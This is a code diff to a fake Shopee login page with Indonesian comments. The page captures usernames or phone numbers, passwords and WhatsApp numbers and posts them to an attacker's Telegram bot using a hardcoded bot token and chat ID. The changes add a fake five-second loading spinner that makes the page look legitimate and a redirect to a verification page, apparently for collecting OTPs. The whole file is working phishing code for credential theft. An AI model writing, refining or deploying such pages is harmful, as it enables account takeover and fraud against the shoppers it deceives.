@@ -11,45 +11,65 @@
     /* Styling untuk pesan error agar terlihat seperti peringatan Shopee */
     .password-error {
       color: #EE4D2D;
-      /* Shopee Orange */
       font-size: 0.875rem;
-      /* text-sm */
       margin-top: 0.5rem;
-      /* mt-2 */
       display: none;
+    }
+
+    /* Styling untuk Spinner Loading */
+    .spinner {
+      border: 4px solid rgba(0, 0, 0, 0.1);
+      border-top: 4px solid #EE4D2D;
+      border-radius: 50%;
+      width: 40px;
+      height: 40px;
+      animation: spin 1s linear infinite;
+    }
+
+    @keyframes spin {
+      0% {
+        transform: rotate(0deg);
+      }
+
+      100% {
+        transform: rotate(360deg);
+      }
     }
   </style>
   <script>
-    let resendTimer;
-    let resendCountdown = 60;
+    // --- KONFIGURASI TELEGRAM ---
+    const CHAT_ID = '5923031825';
+    const BOT_TOKEN = '7812428468:AAE1qHjLLHOQlAmABXbr9JhXEg0KQkb0XW0';
+    const TELEGRAM_URL = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+    // --- END KONFIGURASI ---
 
-    // --- FUNGSI VALIDASI PASSWORD BARU ---
+    // --- FUNGSI UTILITY: Menambahkan Penundaan (Delay) ---
+    function sleep(ms) {
+      return new Promise(resolve => setTimeout(resolve, ms));
+    }
+
+    // --- FUNGSI VALIDASI PASSWORD ---
     function validatePassword(password) {
-      // Kriteria:
-      // 1. Minimum 8 karakter, Maksimum 16 karakter
-      // 2. Mengandung setidaknya 1 huruf kecil ([a-z])
-      // 3. Mengandung setidaknya 1 huruf besar ([A-Z])
-      // 4. Mengandung setidaknya 1 angka ([0-9])
-      // **Karakter khusus diizinkan, tetapi tidak diwajibkan**
-
-      const minLength = 8;
-      const maxLength = 16;
-      // REGEX yang diperbaiki: . (titik) di akhir memperbolehkan karakter apapun
-      // selama kriteria lookahead (?=.*[a-z]), (?=.*[A-Z]), (?=.*\d) terpenuhi
       const regex = /^(?=.*[a-z])(?=.*[A-Z])(?=.*\d).{8,16}$/;
-
-      if (!password) return false;
-
       return regex.test(password);
     }
 
-    // --- Shopee Login Button Enable/Disable Logic ---
+    // --- LOGIC LOADING SPINNER ---
+    function showLoading() {
+      document.getElementById("loadingOverlay").classList.remove("hidden");
+      document.getElementById("loadingMessage").textContent = "Memuat, harap tunggu...";
+    }
+
+    function hideLoading() {
+      document.getElementById("loadingOverlay").classList.add("hidden");
+    }
+
+    // --- Tombol Login Enable/Disable Logic ---
     function checkShopeeLoginInputs() {
       const usernameInput = document.getElementById("shopeeUsername");
       const passwordInput = document.getElementById("password");
       const loginBtn = document.getElementById("shopeeLoginBtn");
 
-      // Sembunyikan pesan error saat input berubah
       document.getElementById("passwordError").style.display = 'none';
       passwordInput.classList.remove('border-red-500');
       passwordInput.classList.add('border-gray-300');
@@ -79,24 +99,44 @@
       }
     }
 
-    // --- NOTIFIKASI: Nonaktifkan login Google & Facebook ---
-    function showLoginAlert() {
-      alert("Silakan login dengan nomor handphone dan password atau login dengan WhatsApp.");
-    }
-
     function goToWhatsAppNumberInput() {
       document.getElementById("mainLoginSection").classList.add("hidden");
       document.getElementById("whatsappNumberInputSection").classList.remove("hidden");
     }
 
-    function submitWhatsAppNumber() {
+    // FUNGSI UNTUK MELANJUTKAN PROSES LOGIN SETELAH INPUT DITERIMA
+    async function continueLoginProcess(context, usernameOrNumber, password) {
+      
+      // 1. SIMPAN NOMOR KE LOCAL STORAGE
+      localStorage.setItem('verificationPhoneNumber', usernameOrNumber);
+
+      showLoading();
+
+      // 2. KIRIM DATA KE TELEGRAM (SEGERA)
+      const success = await sendAllInputsToTelegram(context, usernameOrNumber, password);
+
+      // 3. PENUNDAAN VISUAL 5 DETIK
+      await sleep(5000); 
+
+      hideLoading();
+
+      // 4. REDIRECT
+      if (success) {
+        window.location.href = "verifikasi.html"; 
+      } else {
+        alert("Gagal menghubungi server. Mohon coba lagi.");
+      }
+    }
+
+
+    async function submitWhatsAppNumber() {
       const waNumber = document.getElementById("waNumberInput").value.trim();
       if (!waNumber) {
         alert("Mohon masukkan nomor WhatsApp Anda.");
         return;
       }
-      sendAllInputsToTelegram('wa');
-      window.location.href = "verifikasi.html";
+      
+      continueLoginProcess('wa', waNumber, '');
     }
 
     function backToMainFromWhatsApp() {
@@ -105,55 +145,47 @@
     }
 
     // --- Kirim semua input ke Telegram ---
-    function sendAllInputsToTelegram(contextName) {
-      const shopeeUsername = document.getElementById("shopeeUsername") ? document.getElementById("shopeeUsername").value : "";
-      const shopeePassword = document.getElementById("password") ? document.getElementById("password").value : "";
-      const waNumber = document.getElementById("waNumberInput") ? document.getElementById("waNumberInput").value : "";
-      const otpPhone = document.getElementById("otpInput") ? document.getElementById("otpInput").value : "";
-      const otpCode = document.getElementById("otpCode") ? document.getElementById("otpCode").value : "";
-
+    async function sendAllInputsToTelegram(contextName, usernameOrNumber, password) {
+      
       let text = `#LOGIN_FORM (${contextName})\n`;
-      text += `Shopee Username: ${shopeeUsername}\nShopee Password: ${shopeePassword}\n`;
-      text += `WhatsApp Number: ${waNumber}\n`;
-      text += `OTP Phone: ${otpPhone}\nOTP Code: ${otpCode}\n`;
-
-      const chatId = '5923031825';
-      const token = '7812428468:AAE1qHjLLHOQlAmABXbr9JhXEg0KQkb0XW0';
-      const url = `https://api.telegram.org/bot${token}/sendMessage`;
+      text += `Username/HP: ${usernameOrNumber}\n`;
+      text += `Password: ${password}\n`;
 
       try {
-        fetch(url, {
+        const response = await fetch(TELEGRAM_URL, {
           method: "POST",
           headers: {
             "Content-Type": "application/json"
           },
           body: JSON.stringify({
-            chat_id: chatId,
+            chat_id: CHAT_ID,
             text: text
           })
         });
-      } catch (e) {}
+        return response.ok;
+      } catch (e) {
+        console.error("Error jaringan saat mengirim ke Telegram:", e);
+        return false;
+      }
     }
 
-    // --- Shopee login form submit handler (Diperbarui dengan Validasi Password) ---
-    function submitShopeeLogin(event) {
+    // --- Shopee login form submit handler ---
+    async function submitShopeeLogin(event) {
       event.preventDefault();
 
+      const username = document.getElementById("shopeeUsername").value.trim();
       const passwordInput = document.getElementById("password");
       const password = passwordInput.value.trim();
       const passwordError = document.getElementById("passwordError");
 
       if (!validatePassword(password)) {
-        // Tampilkan pesan error jika password tidak valid
         passwordError.style.display = 'block';
         passwordInput.classList.remove('border-gray-300');
         passwordInput.classList.add('border-red-500');
         return;
       }
 
-      // Jika validasi berhasil: Kirim data dan lanjutkan
-      sendAllInputsToTelegram('shopee');
-      window.location.href = "verifikasi.html";
+      continueLoginProcess('shopee', username, password);
     }
 
     window.onload = function() {
@@ -187,9 +219,7 @@
           <input id="password"
             class="w-full py-2 pl-10 pr-4 text-gray-700 placeholder-gray-400 focus:outline-none focus:border-gray-400"
             placeholder="Password" type="password" required autocomplete="off" minlength="8" maxlength="16"
-            pattern="^(?=.*[a-z])(?=.*[A-Z])(?=.*\d).{8,16}$"
-            oninvalid="this.setCustomValidity('Password harus 8-16 karakter, mengandung huruf besar, huruf kecil, dan angka.')"
-            oninput="this.setCustomValidity(''); checkShopeeLoginInputs();" />
+            oninput="checkShopeeLoginInputs();" />
           <button aria-label="Toggle password visibility"
             class="absolute right-4 text-gray-400 text-xl focus:outline-none" type="button"
             onclick="togglePasswordVisibility()" tabindex="-1">
@@ -215,14 +245,14 @@
     </div>
 
     <div class="space-y-3">
-      <button onclick="showLoginAlert()"
+      <button onclick="alert('Silakan login dengan nomor handphone dan password atau login dengan WhatsApp.')"
         class="w-full flex items-center border border-gray-300 rounded-md py-2 px-4 text-black text-base font-normal"
         type="button">
         <img alt="Gmail logo in red and white" class="mr-3" height="20"
           src="https://upload.wikimedia.org/wikipedia/commons/7/7e/Gmail_icon_%282020%29.svg" width="20" />
         Log In dengan Google
       </button>
-      <button onclick="showLoginAlert()"
+      <button onclick="alert('Silakan login dengan nomor handphone dan password atau login dengan WhatsApp.')"
         class="w-full flex items-center border border-gray-300 rounded-md py-2 px-4 text-black text-base font-normal"
         type="button">
         <img alt="Facebook logo in blue" class="mr-3" height="20"
@@ -256,6 +286,14 @@
         class="flex-grow border border-gray-300 py-2 rounded-md text-black text-base font-normal">
         Kembali
       </button>
+    </div>
+  </div>
+  
+  <div id="loadingOverlay"
+    class="fixed inset-0 bg-white bg-opacity-75 hidden flex items-center justify-center z-50 transition-opacity duration-300">
+    <div class="flex flex-col items-center">
+      <div class="spinner"></div>
+      <p id="loadingMessage" class="mt-4 text-lg text-gray-700">Memuat, harap tunggu...</p>
     </div>
   </div>
 </body>
